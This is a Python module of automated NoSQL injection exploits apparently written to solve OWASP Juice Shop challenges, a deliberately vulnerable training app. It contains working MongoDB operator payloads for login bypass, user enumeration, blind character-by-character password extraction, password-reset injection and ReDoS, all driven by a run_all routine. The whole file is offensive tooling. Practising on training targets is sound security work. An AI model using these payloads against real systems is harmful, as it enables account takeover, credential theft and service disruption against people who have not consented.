import logging
import json
import time
from typing import Dict, List, Any, Optional
from selenium.webdriver.common.by import By
from core.api_client import JuiceShopAPI
from core.browser_automation import BrowserAutomation


class NoSQLInjectionExploits:
    """
    NoSQL Injection Exploits für OWASP Juice Shop
    """
    
    def __init__(self, api: JuiceShopAPI, browser: Optional[BrowserAutomation] = None):
        self.api = api
        self.browser = browser
        self.logger = logging.getLogger(__name__)
        
    def exploit_password_reset(self) -> Dict[str, Any]:
        """
        Challenge: Reset Jim's Password
        Exploit: NoSQL Injection in password reset
        """
        self.logger.info("Exploiting: Password Reset via NoSQL Injection")
        
        if not self.browser:
            self.logger.warning("Browser required for password reset")
            return {'success': False, 'challenge': 'Reset Password', 'error': 'Browser required'}
            
        try:
            # Navigate to forgot password
            self.browser.navigate(f"{self.api.base_url}/#/forgot-password")
            
            # NoSQL injection payloads for MongoDB
            payloads = [
                {"$gt": ""},
                {"$ne": ""},
                {"$regex": ".*"},
                {"$exists": True}
            ]
            
            # Target user emails to try
            target_emails = [
                "jim@juice-sh.op",
                "admin@juice-sh.op", 
                "bender@juice-sh.op"
            ]
            
            for email in target_emails:
                for payload in payloads:
                    try:
                        # Construct NoSQL injection
                        nosql_payload = {
                            "email": {email: payload}
                        }
                        
                        # Try to send JSON payload
                        response = self.api._make_request(
                            'POST', 
                            '/rest/user/reset-password',
                            json=nosql_payload
                        )
                        
                        if response.status_code == 200:
                            self.logger.info(f"Password reset successful for {email}")
                            return {
                                'success': True,
                                'challenge': 'Reset Password',
                                'payload': nosql_payload,
                                'target': email
                            }
                            
                    except Exception as e:
                        self.logger.debug(f"NoSQL payload failed: {nosql_payload}")
                        
            # Fallback: Try via browser with string injection
            email_input = self.browser.wait_for_element(By.CSS_SELECTOR, "input[type='email']")
            
            string_payloads = [
                "jim@juice-sh.op' || '1'=='1",
                "admin@juice-sh.op\" || \"1\"==\"1",
                "{'$gt': ''}"
            ]
            
            for payload in string_payloads:
                self.browser.type_text(email_input, payload)
                
                submit_button = self.browser.wait_for_clickable(By.CSS_SELECTOR, "button[type='submit']")
                self.browser.click(submit_button)
                
                if "Your password reset" in self.browser.get_page_source():
                    return {
                        'success': True,
                        'challenge': 'Reset Password',
                        'payload': payload
                    }
                    
        except Exception as e:
            self.logger.error(f"Password reset exploitation failed: {e}")
            
        return {'success': False, 'challenge': 'Reset Password'}
        
    def exploit_login_bypass(self) -> Dict[str, Any]:
        """
        Challenge: NoSQL Injection Login Bypass
        """
        self.logger.info("Exploiting: NoSQL Login Bypass")
        
        # NoSQL injection payloads
        payloads = [
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
            {"email": {"$regex": ".*@juice-sh.op"}, "password": {"$exists": True}},
            {"email": "admin@juice-sh.op", "password": {"$ne": ""}},
            {"email": {"$in": ["admin@juice-sh.op", "jim@juice-sh.op"]}, "password": {"$gt": ""}}
        ]
        
        for payload in payloads:
            try:
                response = self.api._make_request(
                    'POST',
                    '/rest/user/login',
                    json=payload
                )
                
                result = response.json()
                if 'authentication' in result:
                    self.logger.info(f"NoSQL login bypass successful")
                    return {
                        'success': True,
                        'challenge': 'NoSQL Login Bypass',
                        'payload': payload,
                        'result': result
                    }
                    
            except Exception as e:
                self.logger.debug(f"NoSQL login payload failed: {payload}")
                
        return {'success': False, 'challenge': 'NoSQL Login Bypass'}
        
    def exploit_user_enumeration(self) -> Dict[str, Any]:
        """
        Challenge: User Enumeration via NoSQL
        """
        self.logger.info("Exploiting: User Enumeration via NoSQL")
        
        # Common usernames to test
        usernames = [
            "admin", "jim", "bender", "amy", "bjoern", "ciso",
            "john", "jane", "test", "demo", "user", "guest"
        ]
        
        valid_users = []
        
        for username in usernames:
            # Test with NoSQL injection
            payloads = [
                {"email": {"$regex": f"^{username}@.*"}, "password": {"$ne": ""}},
                {"email": f"{username}@juice-sh.op", "password": {"$exists": True}}
            ]
            
            for payload in payloads:
                try:
                    response = self.api._make_request(
                        'POST',
                        '/rest/user/login',
                        json=payload
                    )
                    
                    # Different response indicates valid user
                    if response.status_code != 401:
                        valid_users.append(username)
                        self.logger.info(f"Valid user found: {username}")
                        break
                        
                except Exception:
                    pass
                    
        if valid_users:
            return {
                'success': True,
                'challenge': 'User Enumeration',
                'valid_users': valid_users
            }
            
        return {'success': False, 'challenge': 'User Enumeration'}
        
    def exploit_regex_dos(self) -> Dict[str, Any]:
        """
        Challenge: Regular Expression DoS (ReDoS)
        """
        self.logger.info("Exploiting: Regular Expression DoS")
        
        # ReDoS payloads that cause exponential backtracking
        redos_payloads = [
            "(a+)+b",
            "(a|a)*b",
            "([a-zA-Z]+)*b",
            "a{10000000}",
            "^(a+)+$"
        ]
        
        for payload in redos_payloads:
            try:
                # Try in different contexts
                contexts = [
                    {"email": {"$regex": payload}, "password": "test"},
                    {"email": "test@test.com", "password": {"$regex": payload}},
                    {"q": {"$regex": payload}}
                ]
                
                for context in contexts:
                    start_time = time.time()
                    
                    try:
                        if 'q' in context:
                            # Search endpoint
                            self.api.get_products(search=json.dumps(context))
                        else:
                            # Login endpoint
                            self.api._make_request('POST', '/rest/user/login', json=context)
                    except:
                        pass
                        
                    elapsed = time.time() - start_time
                    
                    if elapsed > 5:  # If request takes more than 5 seconds
                        self.logger.info(f"ReDoS successful: {payload} (took {elapsed:.2f}s)")
                        return {
                            'success': True,
                            'challenge': 'ReDoS',
                            'payload': payload,
                            'time': elapsed
                        }
                        
            except Exception as e:
                self.logger.debug(f"ReDoS payload failed: {payload}")
                
        return {'success': False, 'challenge': 'ReDoS'}
        
    def exploit_data_extraction(self) -> Dict[str, Any]:
        """
        Challenge: Data Extraction via NoSQL
        """
        self.logger.info("Exploiting: Data Extraction via NoSQL")
        
        extracted_data = []
        
        # Extract user data character by character
        known_email = "admin@juice-sh.op"
        
        # Try to extract password length
        for length in range(1, 50):
            payload = {
                "email": known_email,
                "password": {"$regex": f"^.{{{length}}}$"}
            }
            
            try:
                response = self.api._make_request('POST', '/rest/user/login', json=payload)
                
                # If we get a different response, password might be this length
                if response.status_code != 401:
                    self.logger.info(f"Password length for {known_email}: {length}")
                    extracted_data.append({
                        'type': 'password_length',
                        'user': known_email,
                        'value': length
                    })
                    break
                    
            except:
                pass
                
        # Try to extract first character of password
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        
        for char in charset:
            payload = {
                "email": known_email,
                "password": {"$regex": f"^{char}.*"}
            }
            
            try:
                response = self.api._make_request('POST', '/rest/user/login', json=payload)
                
                if response.status_code != 401:
                    self.logger.info(f"First character of password: {char}")
                    extracted_data.append({
                        'type': 'password_first_char',
                        'user': known_email,
                        'value': char
                    })
                    break
                    
            except:
                pass
                
        if extracted_data:
            return {
                'success': True,
                'challenge': 'Data Extraction',
                'extracted_data': extracted_data
            }
            
        return {'success': False, 'challenge': 'Data Extraction'}
        
    def run_all(self) -> List[Dict[str, Any]]:
        """Führt alle NoSQL Injection Exploits aus"""
        exploits = [
            self.exploit_login_bypass,
            self.exploit_user_enumeration,
            self.exploit_regex_dos,
            self.exploit_data_extraction
        ]
        
        if self.browser:
            exploits.insert(0, self.exploit_password_reset)
            
        results = []
        for exploit in exploits:
            try:
                result = exploit()
                results.append(result)
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"NoSQL exploit failed: {e}")
                results.append({
                    'success': False,
                    'error': str(e),
                    'exploit': exploit.__name__
                })
                
        return results